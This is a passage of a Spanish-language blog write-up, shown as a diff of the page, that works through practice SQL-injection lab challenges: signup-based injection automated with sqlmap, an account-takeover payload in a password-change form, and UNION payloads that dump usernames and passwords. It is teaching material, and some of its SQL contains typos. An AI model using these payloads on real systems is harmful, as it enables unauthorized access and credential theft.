+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">'UNION SELECT 1,group_concat(tlb_name) FROM sqllite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%''</code></pre>
+  </div>
+</div>
+
+<p>Para automatizar este tipo de ataque podemos hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">sqlmap</code> , pero un ataque estándar fallará.</p>
+
+<p>La inyección ocurre en el registro del usuario, pero la función vulnerable se encuentra en la página de notas, para que este ataque funcione tenemos que tener en cuenta:</p>
+
+<ol>
+  <li>Registrar un nuevo usuario malicioso.</li>
+  <li>Iniciar sesión con el usuario malicioso.</li>
+  <li>Ir a la página de notas para poder realizar la inyección.</li>
+</ol>
+
+<p>Código de <code class="language-plaintext highlighter-rouge">sqlmap</code> para explotar la vulnerabilidad:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&amp;password=asd"</code></pre>
+  </div>
+</div>
+
+<h2 id="change-password">Change Password</h2>
+
+<p>Seguimos avanzando pero ahora nos enfrentamos a una base de datos la cual tiene la vulnerabilidad anterior (Vulnerable Notes) fixed, una manera de seguir intentando ganar acceso a la base de datos es comprobar si los usuarios pueden cambiar su contraseña, en alguna página de perfil de la base de datos.</p>
+
+<p>Vamos a hacer uso de esta vulnerabilidad para cambiar la contraseña de algún usuario que sea <em>admin</em> y así ganar acceso.</p>
+
+<p>La función de cambiar la contraseña es vulnerable a las SQL injections porque las consultas <em>UPDATE</em> concatenan el <em>username</em> directamente en la consulta SQL.</p>
+
+<p>El diseñador de la base de datos ha puesto un menú de perfil que contiene un <em>placeholder</em> para poner la contraseña, ya que este input viene directamente del usuario.</p>
+
+<p>Podemos ganar acceso haciendo <code class="language-plaintext highlighter-rouge">admin' -- -</code> ya que el diseñador al pensar que el usuario es correcto y seguro lo concatena en la consulta SQL, en vez de usar un <em>placeholder</em> como hace con la password:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">UPDATE users SET password = ? WHERE username = '" + username + "'</code></pre>
+  </div>
+</div>
+
+<p>Después de iniciar sesión como un usuario malicioso, podemos actualizar la contraseña del usuario para poder ‘activar’ la vulnerabilidad.</p>
+
+<p>Cuando cambiamos la contraseña, la aplicación ejecuta dos consultas:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT username, password FROM users WHERE id = ?</code></pre>
+  </div>
+</div>
+
+<p>Si la comprobación es correcta, procede a cambiar la contraseña:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">UPDATE users SET password = ? WHERE username = 'admin' -- -'</code></pre>
+  </div>
+</div>
+
+<p>Esto se resume que en vez de actualizar la contraseña para  <code class="language-plaintext highlighter-rouge">admin' -- -</code> , la aplicación actualiza la contraseña para el usuario legítimo <em>admin</em>. Ahora podemos acceder a la base de datos con el usuario admin.</p>
+
+<h2 id="book-title-1">Book Title 1</h2>
+
+<p>Podemos toparnos con una aplicación que tiene un buscador, en este caso de libros.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 13.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Cada vez que se introduce el titulo de un libro (<em>title</em>) en dicho buscador se realiza una petición <strong>GET</strong>, siendo la consulta que se manda:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '"+ title + "%')</code></pre>
+  </div>
+</div>
+
+<p>Para explotar esta vulnerabilidad lo único que tenemos que hacer es abusar de la cláusula <code class="language-plaintext highlighter-rouge">LIKE</code> , por ejemplo, inyectando <code class="language-plaintext highlighter-rouge">') or 1=1-- -</code> :</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 14.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<h2 id="book-title-2">Book Title 2</h2>
+
+<p>Ahora la aplicación realiza una consulta al principio del proceso, luego se utiliza el resultado de esta para llevar acabo otra consulta que también contiene vulnerabilidades. Ambas consultas son vulnerables, la primera se puede explotar mediante <em>Boolean-based blind injection</em>.</p>
+
+<p>Sin embargo, como la segunda consulta hace uso del resultado de la primera y como hemos comentado anteriormente también contiene vulnerabilidades trabajaremos con esta.  Podemos explotar dicha vulnerabilidad haciendo uso de <em>UNION-based injection</em> en vez de hacer uso de <em>Boolean-based blind injection</em>, ya que podemos hacer la explotación más sencilla y menos ruidosa.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 15.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Vemos que tenemos el mismo panel de consulta de libros, es decir, se realiza una petición <strong>GET</strong> para poder recuperar el libro que le estamos pidiendo.</p>
+
+<p>Como hemos dicho arriba, la aplicación al pedirle el nombre del libro realiza dos consultas, la primera consulta obtiene el ID del libro y la segunda obtiene toda la información del libro a partir de su ID (la primera consulta), aquí vemos las dos consultas:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
+if bid:
+    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
+    </code></pre>
+  </div>
+</div>
+
+<p>Para llevar a cabo esta vulnerabilidad:</p>
+
+<ol>
+  <li>Limitamos el resultado a 0 filas, esto se hace sin dar ningún input o el input que damos no existe.</li>
+  <li>Usamos la cláusula <code class="language-plaintext highlighter-rouge">UNION</code> para controlar lo que devuelve la primera consulta (dato que se usará en la segunda consulta, el ID vamos).</li>
+  <li>Podemos insertar este código <code class="language-plaintext highlighter-rouge">' UNION SELECT ' STRING</code> para ver como se ejecutan ambas consultas.</li>
+</ol>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 16.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Vemos el resultado de lo que devuelve cada consulta, en la primera vemos <code class="language-plaintext highlighter-rouge">'STRING%'</code>, que es usado en la segunda consulta en la cláusula <code class="language-plaintext highlighter-rouge">WHERE</code>.</p>
+
+<p>Por tanto, en vez de inyectar el código <code class="language-plaintext highlighter-rouge">' UNION SELECT 'STRING</code> , podemos inyectar <code class="language-plaintext highlighter-rouge">' UNION SELECT '1' -- -</code> y esto nos devolverá toda la información sobre el libro cuyo ID es 1.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 17.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Si no limitamos el resultado a 0 filas, no tendremos el output de la cláusula <code class="language-plaintext highlighter-rouge">UNION</code>, sino que obtendremos el resultado de la cláusula <code class="language-plaintext highlighter-rouge">LIKE</code>:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">test' UNION SELECT '1'-- -</code></pre>
+  </div>
+</div>
+
+<p>Ponemos el campo “test” y vemos lo que nos devuelven las dos consultas que realiza la aplicación:</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 18.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Vemos que en la segunda consulta, la cláusula <code class="language-plaintext highlighter-rouge">WHERE</code> contiene un ID, anteriormente no sucedía eso, si no que nos devolvía la información del libro en cuestión.</p>
+
+<p>Gracias a esto, ahora tenemos control total de la segunda consulta, donde podemos usar <em>UNION-based SQL injection</em> para extraer toda la información de la base de datos.</p>
+
+<p>Nuestro objetivo en cuestión es que la segunda consulta sea algo similar a:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT * FROM book WHERE id = ' ' UNION SELECT 1,2,3,4-- -</code></pre>
+  </div>
+</div>
+
+<p>Por tanto, si nos fijamos en la imagen, vemos que la cláusula <code class="language-plaintext highlighter-rouge">LIKE</code> al hacer uso de  <code class="language-plaintext highlighter-rouge">test' UNION SELECT '1'-- -</code> nos devuelve un ID, por tanto el código a inyectar quedaría:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT * FROM book WHERE id = ' ' UNION SELECT '-1' UNION SELECT 1,2,3,4- -</code></pre>
+  </div>
+</div>
+
+<p>Tendríamos como resultado:</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 19.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Ahora podemos hacer:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">' union select '-1''union select 1,group_concat(username),group_concat(password),2 from users-- -</code></pre>
+  </div>
+</div>
+
+<hr />
+</p>
+        </div>
+        
+        <div class="disqus-comments" id="disqus_thread"></div>
+        
+      </div>
+    </div>
+  </section>
+  <footer id="footer">
+    <!--Footer Button-->
+    <div class="container has-text-centered has-background-grey-darker" id="backtotop">
+        <a class="has-text-white" onclick="window.scroll(0,0)">BACK TO TOP</a>
+    </div>
+    <!--Footer Main Section-->
+    <div class="has-background-grey-darker">
+        <div class="container columns">
+            <!--Name Section-->
+            <div class="column has-text-left-desktop has-text-centered-mobile">
+                <a href="http://localhost:4000/#about">
+                    <div class="columns">
+                        <div class="column is-one-fifth-desktop is-one-fifth-fullhd is-one-quarter-tablet">
+                            <figure class="image is-64x64">
+                                <img class="is-rounded" src="/assets/images/me.png">
+                            </figure>
+                        </div>
+                        <div class="column is-marginless">
+                            <h5 class="has-text-grey-lighter">Jose Luis Venega</h5>
+                            <div class="content has-text-grey">
+                                <p>Hello, I am Jose Luis Venega Sánchez, a student of Computer Engineering ...</p>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </div>
+
+            <!--Link Section-->
+            <div class="column has-text-white">
+                <h3>More Links</h3>
+                
+                
+                <!-- <li>
+                    <a href="http://localhost:4000/test-page">Test Page</a>
+                </li> -->
+                
+                
+                <li>
+                    <a target="_blank" href="http://localhost:4000/feed.xml">Subscribe via RSS</a>
+                </li>
+            </div>
+
+            <!--Blog-post Section-->
+            <div class="column has-text-white">
+                <h3>Recent Posts</h3>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/ChillHack">ChillHack</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/DNS">Sistema de Nombres de Dominio "DNS"</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/Startup">Start-up</a>
+                </li>
+                
+            </div>
+        </div>
+    </div>
+    <!-- <div class="has-background-black has-text-centered has-text-white" id="credits">
+        <i class="far fa-copyright"></i> 2024 | <a href="https://github.com/thedevslot/WhatATheme" target="_blank" rel="noopener noreferrer">WhatATheme</a> - A Theme made with <i class="fas fa-heart has-text-danger"></i> by <a href="https://www.twitter.com/thedevslot" target="_blank" rel="noopener noreferrer">TheDevsLot</a> Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a>
+    </div> -->
+</footer>
+
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <span class="close" onclick="closeModal()">&times;</span>
+    <img class="modal-content" id="img01">
+  </div>
+ <!-- Prism.js Script -->
+
+  <script src="../prism.js"></script>
+  <script>
+    function copyToClipboard(button) {
+    const codeBlock = button.closest('.code-container').querySelector('code');
+    navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+        button.textContent = 'Copiado';
+        setTimeout(() => {
+            button.textContent = 'Copiar';
+        }, 2000);
+    }).catch(err => {
+        console.error('Error al copiar el texto: ', err);
+    });
+}
+
+     function openModal(imgSrc) {
+      var modal = document.getElementById("myModal");
+      var modalImg = document.getElementById("img01");
+
+      modal.style.display = "block";
+      setTimeout(function() {
+        modal.classList.add('show');
+      }, 10); // Delay to trigger the animation
+      modalImg.src = imgSrc;
+    }
+
+    function closeModal(event) {
+      if (event) event.stopPropagation(); // Prevents closing when clicking the close button
+      var modal = document.getElementById("myModal");
+      modal.classList.remove('show');
+      setTimeout(function() {
+        modal.style.display = "none";
+      }, 300); // Match this duration with the CSS animation duration
+    }
+
+    // Close modal when clicking outside the content
+    window.onclick = function(event) {
+      var modal = document.getElementById("myModal");
+      if (event.target == modal) {
+        closeModal();
+      }
+    }
+  </script>
+</body>
+</html>
